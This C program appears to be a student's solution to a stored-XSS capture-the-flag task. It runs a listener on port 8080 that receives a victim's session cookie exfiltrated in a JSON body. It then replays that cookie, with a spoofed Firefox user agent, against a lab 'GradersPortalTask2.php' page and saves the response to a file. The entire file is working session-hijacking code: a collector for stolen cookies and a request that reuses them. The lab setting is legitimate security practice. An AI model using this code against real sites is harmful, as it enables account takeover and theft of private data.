#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <ctype.h>

#define PORT 8080
#define BUF_SZ 16384

#define HOST "http://192.168.1.203:80/"
#define PATH "/GradersPortalTask2.php"
#define SERVER_IP "192.168.1.201"
#define WEBSERVER_IP "192.168.1.203"

int hexval(char c) {
    if ('0' <= c && c <= '9') return c - '0';
    if ('a' <= c && c <= 'f') return c - 'a' + 10;
    if ('A' <= c && c <= 'F') return c - 'A' + 10;
    return -1;
}

// in-place URL decode
void urldecode(char *s) {
    char *src = s;
    char *dst = s;

    while (*src) {
        if (*src == '%' &&
            isxdigit((unsigned char)src[1]) &&
            isxdigit((unsigned char)src[2])) {

            int hi = hexval(src[1]);
            int lo = hexval(src[2]);
            *dst++ = (char)((hi << 4) | lo);
            src += 3;
            } else if (*src == '+') {
                *dst++ = ' ';
                src++;
            } else {
                *dst++ = *src++;
            }
    }
    *dst = '\0';
}

int receiveCookie(char *cookie, size_t cookie_sz) {
    int s  = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;

    int opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(s);
        exit(1);
    }

    opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(s);
        exit(1);
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(s, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
        close(s);
        return 0;
    }

    if (listen(s, 1) < 0) {
        close(s);
        return 0;
    }
    int c = accept(s, NULL, NULL);
    if (c < 0) {
        close(s);
        return 0;
    }

    char buf[BUF_SZ];
    ssize_t n = recv(c, buf, sizeof(buf) - 1, 0);
    if (n <= 0) {
        close(c);
        close(s);
        return 0;
    }
    buf[n] = '\0';

    // find body
    char *body = strstr(buf, "\r\n\r\n");
    if (!body) {
        close(c);
        close(s);
        return 0;
    }
    body += 4;

    //find cookie
    char *p = strstr(body, "\"cookie\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            p++;
            while (*p == ' ' || *p == '"') p++;
            char *end = strchr(p, '"');
            if (end && (size_t)(end - p) < cookie_sz) {
                memcpy(cookie, p, (size_t)(end - p));
                cookie[end-p] = '\0';
            }
        }
    }

    //http response
    const char resp[] =
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: 2\r\n"
        "Connection: close\r\n"
        "\r\nOK";
    (void)send(c, resp, sizeof(resp) - 1, 0);

    close(c);
    close(s);
    return 0;
}

int getFlagFromGrades(char *cookie) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 0;

    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port = htons(80);
    if (inet_pton(AF_INET, WEBSERVER_IP, &srv.sin_addr) != 1) return 0;
    if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        return 0;
    }

    urldecode(cookie);
    char req[2048];
    int n = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "Cookie: %s\r\n"
        "\r\n",
        PATH, WEBSERVER_IP, cookie);
    if (n < 0 || n >= (int)sizeof(req)) return 0;

    size_t off = 0, len = (size_t)n;
    while (off < len) {
        ssize_t s = send(sockfd, req + off, len - off, 0);
        if (s <= 0) return 0;
        off += (size_t)s;
    }

    FILE *fp = fopen("spoofed-stored.txt", "wb");
    if (!fp) return 0;

    char buf[8192];
    for (;;) {
        ssize_t r = recv(sockfd, buf, sizeof(buf), 0);
        if (r == 0) break;
        if (r < 0) return 0;
        fwrite(buf, 1, (size_t)r, fp);
    }

    fclose(fp);
    close(sockfd);
    printf("Saved raw HTTP response to spoofed-stored.txt\n");
    return 0;
}


int main(void) {
    char cookie[1024] = {0};
    receiveCookie(cookie, sizeof(cookie));
    getFlagFromGrades(cookie);
    return 0;
}
